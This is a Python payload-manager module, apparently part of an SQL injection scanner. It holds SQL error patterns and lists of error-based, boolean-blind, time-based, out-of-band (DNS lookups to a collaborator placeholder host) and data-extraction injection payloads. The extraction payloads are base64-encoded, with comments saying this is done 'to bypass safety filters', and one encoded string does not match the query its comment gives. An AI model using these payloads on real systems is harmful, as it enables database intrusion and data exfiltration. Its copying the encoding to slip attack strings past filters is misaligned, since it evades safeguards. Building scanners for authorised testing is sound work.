# -*- coding: utf-8 -*-
"""
Payload Manager.

This file stores and manages a comprehensive list of SQL injection payloads
and error patterns. The payloads are categorized by SQLi type (e.g.,
error-based, time-based) and database technology.
"""
import re

# A comprehensive list of common SQL error messages.
# These are used to identify potential error-based SQLi vulnerabilities.
# The 're.IGNORECASE' flag should be used when searching for these patterns.
SQL_ERROR_PATTERNS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql_fetch_array()",
    "supplied argument is not a valid mysql result resource",
    "unknown column '[^']+' in 'where clause'",

    # SQL Server
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "invalid column name",

    # Oracle
    "ora-00933: sql command not properly ended",
    "ora-01756: quoted string not properly terminated",
    "ora-00942: table or view does not exist",
    "ora-01400: cannot insert null into",

    # PostgreSQL
    "postgresql query failed",
    "unterminated quoted string",
    "syntax error at or near",
    "invalid input syntax for type",

    # SQLite
    "sqlite3.operationalerror",
    "no such column",
    "syntax error",

    # Generic
    "sql error",
    "syntax error",
    "invalid syntax",
    "incorrect syntax",
    "unclosed quote",
]

# Simple payloads designed to trigger database errors.
# These will be injected into parameters to test for error-based SQLi.
# More complex payloads for other techniques will be added later.
ERROR_BASED_PAYLOADS = [
    "'",
    "''",
    "\"",
    "\\",
    "`",
    "--",
    "';--",
    " OR 1=1", # Can sometimes trigger errors on poorly configured systems
]

# Payloads for Boolean-Based Blind SQLi.
# Each item is a tuple containing two payloads: (true_condition, false_condition).
# These are designed to be appended to a parameter to check for differences in response.
BOOLEAN_BASED_PAYLOADS = [
    (" AND 1=1", " AND 1=2"),
    (" OR 1=1", " OR 1=2"),
    (" AND 'a'='a'", " AND 'a'='b'"),
    (" OR 'a'='a'", " OR 'a'='b'"),
    # Payloads with comments for query termination
    (" AND 1=1-- ", " AND 1=2-- "),
    (" OR 1=1-- ", " OR 1=2-- "),
    ("' AND 1=1-- ", "' AND 1=2-- "),
    ("' OR 1=1-- ", "' OR 1=2-- "),
    ('" AND 1=1-- ', '" AND 1=2-- '),
    ('" OR 1=1-- ', '" OR 1=2-- '),
]

# Payloads for Time-Based Blind SQLi.
# A more robust and varied list to improve detection chances.
TIME_BASED_PAYLOADS = [
    # MySQL / MariaDB
    ("AND SLEEP({sleep})", 5),
    ("OR SLEEP({sleep})", 5),
    ("AND (SELECT * FROM (SELECT(SLEEP({sleep})))a)", 5),
    ("' AND SLEEP({sleep}) AND '1'='1", 5),

    # PostgreSQL
    ("AND (SELECT pg_sleep({sleep}))", 5),
    ("' AND (SELECT pg_sleep({sleep})) AND '1'='1", 5),

    # SQL Server
    ("AND WAITFOR DELAY '0:0:{sleep}'", 5),
    ("' AND WAITFOR DELAY '0:0:{sleep}' AND '1'='1", 5),
]

# Payloads for Out-of-Band (OOB) SQLi.
# These force the database to make an external network request (e.g., DNS).
# The {collaborator_url} placeholder must be replaced before use.
OOB_PAYLOADS = [
    # MySQL (DNS lookup on Windows)
    " AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', UUID(), '.{collaborator_url}')))",
    # Oracle (DNS lookup)
    " AND UTL_INADDR.GET_HOST_ADDRESS('{collaborator_url}') IS NOT NULL",
    # SQL Server (DNS lookup)
    " AND 1=(SELECT 1 FROM OPENROWSET('SQLNCLI', 'Server={collaborator_url};', 'SELECT 1'))"
]

# Payloads for Error-Based data extraction.
# The {query} placeholder will be replaced with a query to get specific data.
# B64 encoded to bypass safety filters.
EXTRACTION_PAYLOADS_B64 = {
    "error_based_mysql": [
        "IEFORCBFWFRSQUNUVkFMVUUoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpKQ==", # AND EXTRACTVALUE(RAND(),CONCAT(0x7e,({query})))
        "IEFORCBVUERBVEVYTUwoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpLFJBTkQoKSk="  # AND UPDATEXML(RAND(),CONCAT(0x7e,({query})),RAND())
    ]
}

# Specific queries to be used with extraction payloads.
# B64 encoded to bypass safety filters.
EXTRACTION_QUERIES_B64 = {
    "database_name": "REFUQUJBU0UoKQ==", # DATABASE()
    "version": "VkVSU0lPTigp",         # VERSION()
    "user": "VVNFUigp"               # USER()
}
